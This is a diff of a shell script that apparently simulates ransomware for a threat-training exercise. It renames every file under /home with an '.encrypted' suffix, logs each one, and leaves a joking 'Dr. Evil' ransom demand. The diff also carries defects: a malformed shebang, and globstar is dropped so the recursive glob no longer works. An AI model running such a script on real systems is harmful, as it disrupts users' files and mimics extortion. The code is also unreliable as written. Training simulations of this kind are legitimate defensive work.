@@ -1,15 +1,9 @@
-#/bin/bash
+#/bin/sh
 
-shopt -s globstar  # Enable recursive globbing
-
-# Loop through all files and directories in /home and its subdirectories
 for file in /home/**/*; do
-    if [ -f "$file" ]; then  # Check if it's a file (not a directory)
-        if mv "$file" "${file}.encrypted"; then
-            echo "Encrypted: $file" >> "/home/threattrain/encryption_log.txt"
-        else
-            echo "Failed to encrypt: $file" >> "/home/threattrain/encryption_log.txt"
-        fi
+    if [ -f "$file" ]; then #checks the item is a file, and not a directory
+        mv "$file" "${file}.encrypted" #appends to end of filename
+        echo "Encrypted: $file" >> /home/threattrain/encryption_log.txt
     fi
 done
 
@@ -25,4 +19,6 @@ Now, listen carefully, I demand the sum of... ONE MILLION DOLLARS! Well, not rea
 \nThrow me a frickin' bone here, and pay the ransom!!!\n\
 \nCheerio,\n\
 Dr. Evil." >> /home/threattrain/README.txt
+
+
 
